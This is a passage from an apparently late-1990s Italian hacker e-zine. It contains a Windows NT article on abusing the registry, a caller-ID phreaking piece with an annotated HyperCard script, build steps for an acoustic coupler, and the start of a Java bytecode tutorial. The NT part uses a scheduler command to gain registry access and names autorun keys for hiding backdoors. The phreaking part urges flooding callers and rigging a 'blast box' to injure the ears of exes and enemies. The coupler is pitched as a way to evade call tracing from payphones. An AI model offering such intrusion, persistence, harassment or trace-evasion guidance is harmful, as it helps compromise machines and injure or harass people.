Riepilogando: e' possibile fare qualsiasi cosa quando si ha il registry a
nostra disposizione, dai troiani alle backdoor a quel cavolo che abbiamo
voglia. Come? Vediamo qualche metodo:

Sistema Remoto
--------------
1. Connettersi al computer remoto via NetBios ()
2. Eseguire regedit
3. In "Registro di Configurazione" selezionare "Connetti a registro di
   configurazione di rete"
4. Selezionare "Sfoglia"
5. Selezionare il Computer Remoto
6. In "Utenti" selezionare l'utente loggato. Di solito l'utente e' uno solo
7. Modificare un po' di roba (Da remoto e' possibile modificare solo
   HKEY_USERS, HKEY_CURRENT_USER e HKEY_LOCAL_MACHINE)
8. Salvare e disconnettersi

Il problema e' che per accedere al registro bisogna avere i diritti di
ADMINISTRATOR per accedere al registro. Qualche idea? ^_^

Sistema Locale
--------------
Qui occorre essere loggato sul bersaglio. (Anche qui si accettano suggerimenti
cmq tranquilli... tra un numero o due ne riparleremo, magari ^_^)
Ok. Adesso bisogna far partire lo scheduler service (Pannello di
controllo/Servizi) e poi dal prompt digitare:
	at <ora> /interactive "regedit.exe"
Se tutto va bene dovrebbe saltar fuori un messaggio del genere:
(Siccome ho la versione inglese di NT e non ricordo come sia in italiano
arrangiatevi e usate un po' il brain una volta tanto)
	Added a new job with job ID = 0
Al posto di <ora> mettete l'ora corrente + un minuto o due giusto per darvi il
tempo di digitare ^_^
Una volta avviato siete liberi di modificare quel che volete.
Evviva... :P
Adesso vediamo un po' cosa possiamo scriverci in questo bel Registry...
Potenzialmente ci possiamo mettere backdoor, nuovi utenti, finti device,
prenderci codici e password (o almeno utili hash da crakkare), e chi piu' ne
ha piu' ne metta... Ovviamente occorre sapere cosa inserire e soprattutto
DOVE inserire le chiavi, dato che il bravo registry e' piuttosto vasto...
Qualche esempio:

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce
Qui mettiamo la nostra bella backdoor da far eseguire e poi occultare ^_^

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
Qui la mettiamo se occorre che venga eseguita ad ogni reboot della macchina

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths
Qui possiamo modificare i path dei programmi di default... Immaginate cosa si
puo' fare riassegnando un nostro codice al posto di uno dei suddetti ^_^

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\SafeSites
Se volete assicurare il vostro sito come Sicuro :]

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\SO
Quest'ultimo e' veramente spaziale.... Temo pero' che sia esclusivo di
NT5/Win2000. Praticamente abbiamo il controllo delle ActiveX... penso che tra
un po' diventeranno la tecnologia per eccellenza di ogni NT hacker che si
rispetti ^_^
Grazie Micro$uck... grazie di esistere e di averci dato le ActiveX... cosi'
possiamo far male meglio alla gente ^_^
Ad ogni modo consiglio caldamente di dare un'occhiata alle varie chiavi... si
possono scoprire cose incredibili solo smanettando un po' nel registry...
Comunque dal prossimo numero cominceremo a smanettare i magnifici comandi NET
e a scrivere del bel codice, roba da far impallidire il Back Orifice
(soprattutto per il fatto di poter giocare decentemente anke con NT)...
Alla prossima,
Dark Schneider



==============================================================================
----------------------------------[ PHREAKiNG ]-------------------------------
==============================================================================


--------------------------[ CALLERiD: RiFLESSi0Ni ]---------------------------
----------------------------------[ pIGpEN ]----------------------------------

C0NSUM0: 2 barattoli di CocaCola
         4 Nesquik (quelle palline di cioccolato)

MUSiCA: Pearl Jam - (non mi ricordo il nome del cd)
ATTACHMENT: callerid.gif

Avete presente quei temi che vi davano a scuola nei compiti in classe su cui
riflettete se scrivere quello che pensate o quello che il prof. pensa :))
Beh qui non centra un cazzo :)))

WoW! CALLERiD che bella cosa 8)
Okok voi phreaker penserete, niente piu' green... ahahhaha come se questo
bastasse a fermarvi :)) Sinceramente penso che in Italia tra i phreaker sara'
importata la legge "smerdamento dei log" in fondo piu' uno logga e piu' ha
piacere di trovarci qualkosa dentro ;)))
Hummm... pensate ai vantaggi che pero' si puo' avere dal CallerId.

Parlo del fatto di poter mettere qualkosa di simile ad un firewall sulla
propria linea... Della serie:

"Firewalls are also important since they can provide a single "choke point"
where security and audit can be imposed. Unlike in a situation where a
computer system is being attacked by someone dialing in with a modem, the
firewall can act as an effective "phone tap" and tracing tool."

Sisi' non vedo l'ora...

Qui le idee sono veramente tante... mi chiedo: "Perche' semplicemente
loggare?" In fondo un'aspirante phreaker o un phreaker deve farsi
rispettare :)

Se il callerid va in porto... o meglio se mai e poi mai raggiungera' casa
mia... cazzo allora si' che mi potrei divertire.

In America da quel che ne so tale funzione puo' essere attivata (poi non so
se l'attivazione consiste nell'aggiunta di tale opzione o se questa e' gia'
attiva e vi danno soltanto il device per il monitoraggio) con semplice
richiesta alla compagnia telefonica dell'abbonato (probabilmente pagando
qualcosa in piu' vicino).

Fatto sta che questi device, collegabili ad un computer via seriale, sono
facilmente controllabili via PC e aggiungendoci vicino un po' di mente
deviata potremo avere cose assurde :)

Le cose piu' semplici sono:

- Filtraggio di particolari numeri telefonici o di interi range
  (Vi sta sulle palle il numero della vostra scuola?
   Volete che mai e poi mai questa vi possa chiamare a casa?
   Un bel ban su quel numero farebbe comodo)
   Questa fa parte della semplice "Ignore List"
   Uhmm mi sembra di leggere un libro di Gibson :)

- Passiamo a quella che potrebbe essere l'opzione WARNING.
  Per esempio un semplice programmino (su linux occupa poche righe)
  che prenda un file come input (ottenuto dall'output di un programma un
  po' piu' serio che elabora le informazioni ottenute dal device) e che
  faccia una chiamata ai numeri della Ignore List o della Shit List
  o magari trasmetta un wave del tipo "Caro pezzo di merda il vostro numero
  non ha accesso alla mia linea"... vedete di programmare bene la funzione...
  non vorrete di certo spendere troppi soldi per fare la chiamata al
  pezzo di merda :))

- Che ne dite poi di avere sul vostro HD un bel file tipo "BLACK LIST"
  Della serie metteteci dentro i numeri delle vostre ex-ragazze/i, dei
  vostri nemici ecc...
  Il programma che si occupa della gestione del device potrebbe avere
  una funzione che ogni qualvolta ricevete una chiamata fa il compare
  del numero telefonico con quelli inseriti nella BLACKLIST e se lo
  trova fa un NUMBER FL00DER oppure i piu' bastardi potrebbero prendere
  in considerazione il fatto di costruire un BLAST B0X collegato al vostro
  HI-FI in piena

  SCHEMA DI BLAST BOXING VIA CALLER-ID
        (disegno molto merdoso)

  -------------------
  |                 |
  |      PROG       |
  |                 |                             M0DEM
  |                 |                         (ok fa cagare)
  -------------------                               ||
          | |                                       \/            
  -------------------                            ---------  tramite jack (IN)
  |                 | [COM1]<--------/---------->|0|0|0|0| <------
  -------------------                            ---------       | 
                      [COM2]<--CALLER-ID          ^              |
                                DEVICE+iNTERFACE  |          ---------
                                   |              |          | BLAST | *
                                   v              v          |  B0X  |
                                   ----------------          ---------
                                         |
                                         |
                                         |
                                    linea telefonica
                                  (eventualmente usando
                                     prese multiple)

* Esistono varie versioni da quella usata per i Crossbar (semplice
microfono collegato a linea telefonica) a veri e propri amplificatori :)
C'e' anche una versione che si mette in mezzo tra modem e HI/FI ad ogni
modo basterebbe pure l'HI-Fi al posto del BOX...
Non so fino a che punto si possa blastare un orecchio ;)) ... credo e spero
non molto con le nuove linee ... boh ... In fondo lo speaker della cornetta
e' merdosetto ... boh non mi sono mai messo con la trombetta dello stadio a
provare, forse se chiedete a qualcuno della drug division se puo' provare
con uno dei suoi due .. dite che a chiesto pIG se puo' sacrificare un
orecchio per BFi ;))
Scommetto che vi risponde ... per il progresso della scienza questo e
altro :))
Eh si noi non useremo mai le caprette o i topini come cavie, esiste il
proprio corpicino per certe cose ;)))

Ah si' lancio un appello: qualcuno di voi ha un fegato sano?
Lo sto cercando prima di un futuro trapianto...
Visto i tempi di consegna... e' meglio premunirsi.

Cmq questa cosa e' solo per sapere che puo' esistere... 
Schemi sui blast box sono facilmente trovabili su Internet... che poi
fungano o meno ci si puo' anche ridere sopra...

Uhm avete un BBS?

- Il vostro bel programmino potrebbe trasmettere al modem di fare un HANGUP
  se il numero telefonico non e' quello di uno degli utenti.

- Uhm vi immaginate che bello? Su Last Login invece del vostro ip viene fuori
  il vostro numero telefonico... Se qualkuno vi usa il vostro account e non
  si e' zappato potreste chiamarlo per insultarlo :))

- Avete presente i moduli PAM su Unix? Sisi' prendete per esempio la funzione
  che limita l'accesso di un utente o di un gruppo di utenti a determinate
  ore... che figo sarebbe fare le stesse cose con i numeri telefonici 8)
  Della serie l'ufficio puo' chiamare il mio computer di casa solo se ci
  troviamo nel range di ore in cui sono in ufficio e lavoro :)

Okok ce ne vorra' di tempo? ahahhaha neanche tanto :) cmq...

CREDETE che Sia Impossibile?
Uhmm guardate questo pezzo di codice di Mace Moneta

-- CallerID Support Code - COPYRIGHT 1989, 1990 BY Mace Moneta

--===========================================================
-- ALL RIGHTS RESERVED.
-- FOR MORE INFORMATION CONTACT THE AUTHOR DIRECTLY.
-------------------------------------------------------------

--
-- Put the IDLE handler to sleep while editing a field
--
on openField
  global editingField
  put true into editingField
end openField

--
-- Wakeup the IDLE handler when finished field editing
--
on closeField
  global editingField
  put false into editingField
end closeField

--
-- OPEN STACK
--

on openStack

  --
  -- Cache the stack in memory for fastest access
  --
  set cursor to watch
  set lockScreen to true
  show all cards
  set lockScreen to false
  set cursor to none
  --
  -- Initialize Variables
  --
  global editingField,lastLookup
  global globalATPData, globalResponseData
  global globalReceiveData, myEntityName
  global globalSKTData, globalNBPData
  global modemData,myName,serverName,EotDC2,EotHT
  global soundList,soundCount,serialBuffer
  put false into editingField
  put sndList() into soundList
  put the number of lines in soundList into soundCount
  put empty into globalResponseData
  put empty into globalAppleTalkData
  put empty into modemData
  put empty into serverName
  put numToChar(4) & numToChar(18) into EotDC2
  put numToChar(4) & numToChar(9) into EotHT
  put the seconds into lastLookup
  --
  -- Before we can become an entity on the network, we must first
  -- open up access to the network.  ATPOPEN performs this function
  -- and relies on the variable "globalAppleTalkDATA".
  -- Since ATPOPEN is not given a parameter, it will open both a client
  -- and a server side allowing us to both issue requests and respond
  -- to requests.
  --
  ATPOpen
  if the result is empty then
    --
    -- If ATPOPEN was successful we can go ahead and register our name
    -- with the network.
    --
    NBPOpen
    --
    -- We'll use the number of elapsed 1/60's of a second since IPL
    --
    -- as our unique "name".
    --
    put the ticks into myName
    put "CallerID" into myType
    NBPRegisterName myName,myType
    if the result is not empty then
      --
      -- We had a problem connecting!
      --
      answer "Error connecting to AppleTalk!" with "Ok"
    end if
end if

  --
  -- Initialize the serial port to 1200bps, 1 stop, 8 data bits,
  -- no parity.
  --
  put serialHandler("open","A",1200,8,"none",1,"CTS",1024) B
  into serialBuffer

end openStack

on goingElsewhere
  --
  -- If we are leaving this stack (quiting or opening another stack)
  -- terminate our session on Appletalk and close the serial port.
  --
  global serialBuffer
  put empty into globalResponseData
  put empty into globalAppleTalkData
  NBPClose
  ATPClose
  get serialHandler("close","A",serialBuffer)
end goingElsewhere

--
-- CLOSE STACK
--

on closeStack
   goingElsewhere
end closeStack

--
-- IDLE
--

on idle
  global editingField,lastLookup
  global talkName,talkKeyword,EotDC2,EotHT
  global globalResponseData,globalReceiveData
  global modemData,myName,serverName,dataSource
  global soundList,soundCount,serialBuffer

  if editingField then exit idle

  --
  -- Initialize variables
  --
  put empty into modemData
  put empty into talkName
  put empty into talkKeyword
  put false into outOfArea
  set cursor to hand
  --
  -- Check for activity on the serial port
  --
  put serialHandler("get","A",3) into modemData
  --
  -- If we got something, remember where it came from.
  --
if modemData is not empty then put "fromComm" into dataSource
--
-- If nothing came in over the serial port, check the other Mac,
-- to see it it got anything
--
-- First, check to see if a "CallerID" server is on the network
-- (a copy of this Hypercard stack, running on another machine)
--
put the seconds into it
if serverName is empty and it > lastLookup then
   set cursor to watch
   put the seconds + 30 into lastLookup
   put NBPLookupNames("CallerID","*","20","2","8") into entityNames
   repeat with x=l to the number of lines in entityNames
      put line x of entityNames into it
      if "CallerID" is in item 2 of it and myName is not in item 1 of it then
        put item 1 of it into serverName
        exit repeat
      end if
   end repeat
end if
--
-- Now ask the network for data
--
if modemData is empty and serverName is not empty then
  ATPReceive "HandleReceive"
  --
  -- If we got something, remember where it came from.
  --
  if modemData is not empty then put "fromAT" into dataSource
end if
--
-- Scan the data for EOT DC2 sequence (header for known number)
-- or EOT HT (header for Out of Area call or Private - Blocked)
--
if modemData is not empty then
  repeat with i = 1 to the length of modemData
  if char i to i+1 of modemData is EotHT then put true into outOfArea
  if char i to i+1 of modemData is EotDC2 or outOfArea then
      --
      -- Header found.  Extract the phone number of the caller
      --
      if outOfArea then
        if char i+6 of modemData is "P" then
          --
          -- We've got a blocked call!  Announce as such by
          -- looking up the record with pseudo phone numbe
          -- CAL-LER-IDBL.
          --
          put "CAL" into areaCode
          put "LER" into exchange
          put "IDBL" into number
          put "CAL-LER-IDBL" into phone
          else
          --
          -- Just an out of area call.  Look up the record
          -- with pseudo phone number ???-???-???? and announce.
          --
          put "???" into areaCode
          put "???" into exchange
          put "????" into number
          put "???-???-????" into phone
          end if
          else
        --
        -- We have an actual phone number!
        --
        put char i+10 to i+20 of modemData into phone
        put char 1 to 3 of phone into areaCode

   put char 4 to 6 of phone into exchange
   put char 7 to 10 of phone into number
   put areaCode & "-" & exchange & "-" & number into phone
   end if
--
-- If we obtained data from the serial port,
-- see if anyone on the network wants our data
--
if dataSource contains "fromComm" then
   ATPSendRequest serverName,modemData, B
   "HandleSend", 2, 2 0
   --
   -- If we got an error, the server went bye-bye. Clear
   -- the serverName, so that we will re-issue the Lookup
   -- for a server.
   --
   if the result is not empty then put empty into serverName
   put empty into modemData
   end if
--
-- Define a "trunk" number to search for, incase the full
-- number is not found.
--
put areaCode & "-" & exchange & "-" & "????" into trunk
--
-- Search the directory for the phone number.
-- In this stack, each record can contain up to 3 phone
-- numbers. They are kept in the background field variables
-- (bg fld) "Phone1", "Phone2" and "Phone3".
--
get the short name of this card
if it is "Index" then go to next card
find phone in bg fld "Phone1"
if the result is "not found" then
  find phone in bg fld "Phone2"
  if the result is "not found" then
    find phone in bg fld "Phone3"
  end if
end i f
--
-- If the number was not found, see if we have a trunk line
--
if the result is "not found" then
   find trunk in bg fld "Phone1"
   if the result is "not found" then
     find trunk in bg fld "Phone2"
     if the result is "not found" then
       find trunk in bg fld "Phone3"
     end if
   end if
end if
--
-- If we found the entry, extract the callers name and
-- invoke the announceCaller routine
--
if the result is empty then
   put bg fld "Name" into talkName
   put bg fld "Keywords" into talkKeyword
   announceCaller
   --
   -- Annotate the entry so we know the last call date and time
   --
   get line 1 of bg fld "Note"
   if it is "NOTE PAD" or word 1 to 2 of it is "Last Call: " then
     set locktext of bg fld "Note" to false
     put "Last Call: " && the long date && the time B
     into line 1 of bg fld "Note"
     set locktext of bg fld "Note" to true
   else
     set locktext of bg fld "Note" to false

            put "Last Call:" && the long date && the time & return B
            before line 1 of bg fld "Note"
            set locktext of bg fld "Note" to true
            end if
          --
          -- An unknown caller; just announce that there is a call
          --
          if talkName is empty then
            put "Unknown Caller NOSUFFIX" into talkKeyword
            put "Telephone Call" into talkName
            announceCaller
            end if
          --
          -- Log the call to file "CallerID Log", if on main machine
          --
          if dataSource contains "fromComm" then
            put "CallerID Log" && word 2 of the long date && B
            word 4 of the long date into logFile
            open file logFile
            --
            -- Position at EOF
            --
            repeat
              read from file logFile for 16834
              if it is empty then exit repeat
              end repeat
            --
            -- Place the data in the log
            --
            put the time into timeStamp
            if the length of timeStamp < 8 Then B
            put "O" & timeStamp into timeStamp
            put the long date into dateStamp
            put word 1 of dateStamp & tab & B
            word 2 to 4 of dateStamp into dateStamp
            write dateStamp & tab & timeStamp & tab & phone & tab & B
            talkName && "(" & talkKeyword & ")" & return B
            to file logFile
            close file logFile
        end if
        exit repeat
     end if
    end if
  end repeat
 end if
end idle

--
-- This routine is invoked when someone is requesting our data.
-- Return the last caller info, and clear it.
--
on HandleSend
  global globalResponseData
  put empty into globalResponseData
end HandleSend

--
-- A server is responding to our request for the caller information.
-- Place it in modemData, for normal processing.
--
on HandleReceive
  global globalReceiveData,modemData
  if globalReceiveData is not empty then B
  put globalReceiveData into modemData
end HandleReceive

--
-- Dummy handler to provide NOP response.  This is automatically
-- invoked by the Appletalk routines, when there is no data to transfer.
--
on okay
end okay

--
-- Here we vocalize the name of the caller using MacinTalk, or if a
-- digitized sound is available with the same name, we play the sound.
--
-- Special values may be passed in the Keyword entry of the directory
-- as follows:
--
-- 24HR         - This caller will be announced no matter what time it is.
--                     Normally, calls between lOPM and 5AM are not announced.
-- IGNORE      - This caller will never be announced (call screening).
-- NOSUFFIX  - This caller will not have the "Calling" word appended
--              to his/her name when being announced.  Normally, callers
--              are announced as "name Calling" (eg. Joe Shmoe Calling).
--
on announceCaller
  --
  -- Get the callers name and the keywords defined for him/her
  --
  global talkName,talkKeyword,soundList,soundCount
  --
  -- Get the current hour, in 24 hour format
  --
  put the time into timeCheck
  convert timeCheck to dateitems

  -- If it is after 1OPM and before 5AM, don't announce the caller.
  -- If the caller has the special "IGNORE" keyword, never announce
  -- the caller (call screening).

  put true into sayingIt
  if item 4 of timeCheck > 22 or B
  item 4 of timeCheck < 5 or B
  talkKeyword contains "IGNORE" then put false into sayingIt
  --
  -- If the caller has the special "24HR" keyword, announce the caller
  -- no matter what time it is.
  --
  if talkKeyword contains "24HR" then put true into sayingIt
 --
 -- If we should announce this caller, do it three times
 --
  if sayingIt then
    put true into soundNotFound
    repeat with soundName = 1 to soundCount
      if line soundName of soundList is talkname then B
      put false into soundNotFound
    end repeat
    put getPVolume() into saveVolume
    setPVolume(7)
    if soundNotFound then
      if "NOSUFFIX" is not in talkKeyword then B
      put talkName && "Calling" into talkName
      talk talkName,140,120
      wait 1 seconds
      talk talkName,140,120
      wait 1 seconds
      talk talkName,140,120
    else
      play talkname
      wait until the sound is "done"
      wait 1 seconds
      play talkname
      wait until the sound is "done"
      wait 1 seconds
      play talkname
      wait until the sound is "done"
      end if
      setPVolume(saveVolume)
    end if
end announceCaller

-----------------------------------------------------------
-- CallerID Support Code - COPYRIGHT 1989, 1990 BY Mace Moneta
-- ALL RIGHTS RESERVED.
-- FOR MORE INFORMATION CONTACT THE AUTHOR DIRECTLY.
-----------------------------------------------------------

Un po' di info :)

All that is necessary to connect the Caller*Id unit to your RS-232 port are:
an MC1488 integrated circuit (available from Radio Shack, for about $l) and
a resistor (lOOK Ohm 1/4 watt, also available from Radio Shack).

The MC1488 "boosts" the output voltage to the level expected by the RS-232
port on your computer, and the resistor provides some isolation and reduces
the voltage drop on the output of the MC1488.

The MC1488 needs a +/- 12volt power supply.  If you have one, you're all set.
If not, Radio Shack sells small 9 volt power supplies for S5-6 each; you can
put two back-to-back to get a +/- 9 volt supply, which is close enough.
You could use a couple of 9volt batteries, too.

Everything, excluding the power supplies, fits into the Caller*id interface
case. I used a little hot-melt glue to place the MC1488 in an unused circuit
board area (watch out for the plastic standoffs on the case!).  Small gauge
wire (or wire-wrap wire) connects the components together.  If you're
uncomfortable soldering to the integrated circuits, you can pick up IC jumper
      clips at Radio Shack as well (that way you can easily remove the
"modification").

I bring the RS-232 pin 3 and pin 7 connections to a 1/8 inch mini-phone jack,
which I mounted on the case near the existing telephone jacks.

Once the circuit is built, what do you do with it?  I use a Hypercard Stack
built on the EXCELLENT Portfolio Hyper System (PHS), by Bob Davis 70625,717,
to look up the phone number, announce the caller (using Macintalk) and provide
filtering (based on time of day and flags on the caller's record).  I log all
incoming calls, both to a separate file and to the record of the caller.

My stack also contains records for telephone exchanges, so if the specific
number is not found, it will announce where (what town) the call is coming
from.

In addition, since I have two Macintosh computers, I broadcast the information
over Appletalk, so both machines can announce the caller.

That should give you enough ideas!  Following is an extract of the major
portion of the Hypercard script I use.  I can't upload the entire stack, since
it's part of PHS.  It should give you enough of the logic needed to build your
own application.

Includo pure lo schemino dovreste trovarlo dentro il file phreak.tgz
allegato a BFi.

Letterina per MAMMA TELEC0M (che puttana ;)

" Vogliamo il CallerId per ogni abbonato! ;)) "

bauz

pIGpEN


-----------------------[ L'ANG0LiN0 Di MAMMA TELEC0M ]------------------------
-----------[ REALiZiAM0 iNSiEME UN ACC0PPiAT0RE DA (sigh!) 300bps ]-----------
----------------------------------[ Jaiss ]-----------------------------------

ORA: 01:34, cazzo e' tardissimo, sta per uscire BFi e io non ho ancora fatto
     un cazzo!
CONSUMO: Le solite 4 diana blu, pacchetto morbido
COLONNA SONORA: Deep Purple - MADE IN JAPAN
                Led Zeppelin - III
                Intercettazioni telefoniche varie con un bello
                scanner Uniden Bearcat (che risate!!)
TEMPO PREVISTO : 19 min. at 56k (ho fatto l'upgrade a V.90 !)

Eccoci qua, di nuovo ritrovati nel fantastico (ma puzzolente) mondo di
teleKom merda. Questa volta andremo un po' piu' in la' della semplice teoria
soffermandoci sulla pratica, costruendoci un apparecchietto economico ma
mooolto utile ai fini esplorativi, con l'interessante possibilita' di essere
utilizzato LONTANO da casa, per i motivi piu' ovvi; signori e signore ecco
a voi un fantastico ACCOPPIATORE ACUSTICO!
Gia' state sorridendo no? Intravvedo molti ghigni satanici su di voi!
Ma, cosa vedo? C'e' qualcuno che non sorride... non sapete cos'e' un
accoppiatore acustico? Nessun problema, Jaiss ve lo spiega!
Cominciamo dal principio: dunque, all'inizio c'erano i dinosauri, poi e'
caduta una cazzo di cometa (proprio dove ora c'e' l'edificio della teleKom,
ma e' arrivata troppo presto) e i dinosauri si sono estinti, poi.. aspe'..
cazzo sono andato troppo indietro!
All'inizio degli anni '80 venivano usati, al posto dei normali modem di oggi,
degli accoppiatori acustici; erano dei dispositivi dove era possibile
"infilare" nel vero senso della parola, la cornetta del telefono, allo scopo
di "accoppiare" (appunto) il microfono e l'altoparlante della cornetta stessa
rispettivamente con un'altro altoparlante e microfono, collegati alla seriale
del modernissimo 80086. Questo accoppiamento era indispensabile per permettere
ai computer di dialogare tramite porte seriali, attraverso la linea
telefonica, con altri computer. In pratica erano dei modem, ma senza
connessione diretta sul doppino telefonico.
Questa assenza di connessione diretta, e di conseguenza il fatto che i segnali
modulati fossero "ascoltati" da un microfono, faceva si' che la connessione
cadesse ad ogni forte rumore. Inoltre, questi strumenti, non erano ancora
dotati, diciamo di "intelligenza", il famoso standard HAYES; in sostanza
erano apparecchi "morti", dovevi fare il numero a mano, attendere il
pirirpirirprirpri e dare uno start al prg.
Che palle!! Ma pensiamo un po' a cosa potremmo fare con un accoppiatore,
un portatile (magari un bell'80086 con un pacco batteria da 5 chili e mezzo)
ed una bella cabina pubblica....... potremmo aggirare qualche bel tracing
di qualche stronzo, no? Al massimo possono trovare la cabina di "via le mani
dal culo" o giu' di li!
Il progetto che vi propongo necessita dei seguenti oggetti:

1 pc/mac portatile
1 modem PMCIA (eeh, mi dispiace ma questo vi ci vuole.. il mio e' solo un
               accoppiatore, la modulazione e la demodulazione ve la fate
               voi...)
1 vecchio telefono a disco (quei bei mattoni grigi)
4 pile da 9V
4 connettori con attacco per pila a 9V
1 po' di cavetti 
1 basetta millefori 5 x 5 cm
1 interruttore a levetta (il minimo che si trova e' un 250v 1A)
1 resistenza da 600 Ohm 1/4W 10%
1 contenitore per alloggiare il dispositivo
2 contenitorini 4x4 per alloggiare il microfono e l'altoparlante
2 Mt di cavetto schermato a 4 poli
1 cavetto telefonico con un RJ11 intestato (quello spinotto di plastica
                                             che si attacca dietro al modem)

Una volta che vi sarete procurati il tutto, prendete subito il telefono
a disco e sventratelo. Estraete dissaldando (se necessario) la bobina
antilocale presente al suo interno. Dovrebbe essere fissata anche con due
"rivetti" alla piastrina di bachelite. Fate attenzione a non danneggiare le
spire in rame. Adesso aprite la cornetta ed estraete microfono e altoparlante.
Benissimo, siamo a cavallo. (no, non a te, Cavallo! era un modo di dire! :))

Collegate adesso i 4 connettori per pile da 9V in serie, nel seguente modo:
   -----      -----      -----      -----
   | O |      | O |      | O |      | O |
   |   |      |   |      |   |      |   |
   | o |      | o |      | o |      | o |
   -----      -----      -----      -----
    | |        | |        | |        | |
    | |--------| |--------| |--------| |
    - +        - +        - +        - +
ISOLATE le connessioni!!
Otterrete un + ed un -. Collegando 4 pile da 9 otterrete quindi 36V, necessari
per "simulare" la linea telefonica e farla modulare (e demodulare) al
modem PMCIA. (Non vi preoccupate! Non si scassa il modem! Sulla linea
telefonica di casa sono presenti anche picchi di 120V!!)

Consultate lo schema accluso insieme a BFi, il file e' phreak.tgz , dovrebbe
essere mooolto piu' esplicativo di questa cazzo di grafica in ascii.
Osservate adesso con attenzione la bobina che avete estratto dal telefono.
Dovreste vedere che da un lato riporta 3 fili di rame, e da un lato solo 2.
A questi 2 fili andra' collegato l'altoparlante.

              bobina antilocale
              -----------------
   -------- - |               | -
   |          |               |
altoparlante  |               | -
   |          |               |
   -------- - |               | -
              -----------------

Dal lato che riporta 3 fili, andranno collegati al polo in alto un filo
proveniente dal cavetto intestato con l'RJ11, dall'altro la resistenza da
600Ohm, e al centro il contatto centrale del microfono estratto.
La "massa" del microfono andra' poi collegata con il polo "-" dei 4 connettori
messi in serie.

              bobina antilocale
              -----------------   600Ohm
   -------- - |               | - /\/\/\ -
   |          |               | 
altoparlante  |               | - al "+" del microfono
   |          |               |
   -------- - |               | - al verde (o rosso) dell RJ11
              -----------------

Il "+" dei connettori andra' collegato ad un interruttore a levetta,
indispensabile per non far scaricare le pile quando non si utilizza
l'apparecchio.

                           |-------|
   il "+"  dei connettori -|       |-| /
                           |       | |/
   alla resistenza e      -|       |-|
 all'altro filo dell'RJ11  |-------|

Sull'altro contatto dell'interruttore, saldate 2 fili: uno andra' collegato
all'estremita' libera della resistenza che avete applicato alla bobina,
l'altro al rimanente filo dell'RJ11. (lo so che ce ne sono 4, usate quelli
centrali, solitamente rosso e verde, o bianco e rosso)
Riassumendo:

             bobina antilocale
             -----------------   600Ohm
  -------- - |               | - /\/\/\ - ---------------------------|-- RJ11
  |          |               |                                     interr.
altoparlante |               | - ["+" mic "-"] -- ["-" batt. "+"] ---|
  |          |               |
  -------- - |               | - al verde (o rosso) dell RJ11 ---------- RJ11
             -----------------

Il tutto dovrebbe essere "collegato" sfruttando la basetta millefori, per
ottenere una costruzione piu' ordinata e robusta, rispetto ad un montaggio
"volante". Chiaramente, con il cavo schermato provvederete ad allungare
microfono e altoparlante e ad inscatolarli per bene.
Tagliate la schermatura in eccedenza del filo che e' uscita durante lo
"spellaggio" di esso.

                          schermatura (eliminare)
                         /
  --------------------  /
                     | ---- filo
                     | ---- filo
                     | ---- filo
                     | ---- filo
  --------------------

Rivettate poi ai due contenitori, due pezzi di "velcro" in modo da poterli
"avvolgere" attorno ad una cornetta di una cabina.
PS: prendete due contenitori adatti a contenere il microfono e l'altoparlante,
che non siano troppo grandi!

     interr.             |--- RJ11 (al modem pmcia del portatile)
      /                  |
 --------------------    |
 |                  |-----
 |  circuito        |                   |---------|               |--------|
 |    accoppiatore  | ------------------| altop.  |---------------|   mic. |
 --------------------                   |---------|               |--------|

Ovviamente, quando effettuerete il collegamento alla cornetta, badate che
il MICROFONO sia sull'ALTOPARLANTE della cornetta e che il vostro ALTOPARLANTE
sia invece sul MICROFONO della cornetta.
         -----------
         |  ALT.   /
         |       /   qui va il microfono
         |     /
 cornetta|    |
         |    |
         |    |
         |    \
         |      \   qui va l'altoparlante
         |  MIC.  \
         -----------

Infine, caricate il vs. programmillo di telecomunicazione, provvedendo pero'
a comporre voi manualmente il numero per lui.
Con telix o terminate, o comunque qualsiasi prg dove la connessione avviene
con un ATDT, digitate ATD e premete invio, poi componete il numero.
Alla risposta dell'altro terminale vedrete comparire un bellisimo (?)
CONNECT 300 (purtroppo questa e' la velocita' massima con questo coso).
Per win, quando il terminale compone il numero, fatelo anche voi sulla
tastiera del bel telefono arancione.. e poi....
Beh, per il resto ve la sbrigate da soli, no? ;)
PS: non fate troppo casino nella cabina, altrimenti vedrete un bel
"NO CARRIER"!

Alla prossima! (se non mi avranno beccato :)

220 BYE -CONNECTION CLOSED-

Jaiss 
woodstock68@hotmail.com



==============================================================================
---------------------------------[ CRACKiNG ]---------------------------------
==============================================================================


---------------------[ JAVA REVERSE ENGEENERiNG: LA JVM ]---------------------
---------------------------------[ LordFelix ]--------------------------------

0.0 Prefazione
1.0 Piccola introduzione al funzionamento di Java
1.1 Principi di funzionamento della JVM
1.2 I frame
2.0 Tools
3.0 Le istruzioni della JVM: un esempio
4.0 Conclusioni

0.0 Prefazione
    ----------

Al giorno d'oggi l'intero web e' infestato da una serie infinita di applet
java di ogni genere. Spesso mi e' sorta la curiosita' di capire come
funzionasse (almeno a grandi linee) l'interprete contenuto in ogni browser di
un certo livello (lynx a parte ;). Questo scritto vuole rappresentare solo una
prima lettura per chiunque voglia approfondire il funzionamento della Java
Virtual Machine (JVM) e dare un'occhiata al codice delle migliori applet
presenti in rete. Non e' mia intenzione sostituirmi a quella che e' la
"bibbia" della JVM, ovvero il libro "The Java Virtual Machine Specification"
di Tim Lindholm e Frank Yellin disponibile on line su http://java.sun.com
In questa breve panoramica ho eliminato tutti quegli aspetti che riguardano
l'implementazione di una JVM, focalizzando l'attenzione sul set di istruzioni
e sugli strumenti disponibili per il reverse engeenering delle classi java.
Nel seguito daro' per scontata la conoscenza di almeno i costrutti
fondamentali del linguaggio java.
Mi scuso in anticipo per eventuali imprecisioni. Vi prego di segnalarmi ogni
incongruenza scrivendomi all'indirizzo lordfelix@dislessici.org

1.0 Piccola introduzione al funzionamento di Java
    ---------------------------------------------

A differenza degli altri linguaggi di programmazione per Java lo scopo
fondamentale e' funzionare su ogni tipo di hadware che possegga una
implementazione della Java Virtual Machine (JVM). In pratica quando compiliamo
un programma in Java il .class che otteniamo non e' codificato per il
linguaggio macchina del nostro processore, ma e' "tradotto" in una specie di
